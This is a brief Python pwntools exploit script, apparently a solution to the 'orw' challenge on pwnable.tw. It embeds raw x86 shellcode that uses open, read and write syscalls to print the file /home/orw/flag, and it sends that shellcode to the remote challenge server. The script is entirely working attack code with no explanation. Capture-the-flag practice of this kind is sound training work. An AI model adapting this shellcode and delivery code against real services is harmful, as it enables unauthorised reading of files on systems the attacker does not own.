#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context.log_level = "debug"

shellcode = '\xeb\x35\xb8\x05\x00\x00\x00\x5b\xb9\x00\x00\x00\x00\xba\x07\x00\x00\x00\xcd\x80\x89\xc3\xb8\x03\x00\x00\x00\x89\xe1\xba\x64\x00\x00\x00\xcd\x80\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\x89\xe1\xba\x64\x00\x00\x00\xcd\x80\xe8\xc6\xff\xff\xff\x2f\x68\x6f\x6d\x65\x2f\x6f\x72\x77\x2f\x66\x6c\x61\x67'

#  io = process("./orw")
io = remote("chall.pwnable.tw", 10001)
io.sendafter("shellcode:", shellcode)
print io.recv()
io.close()
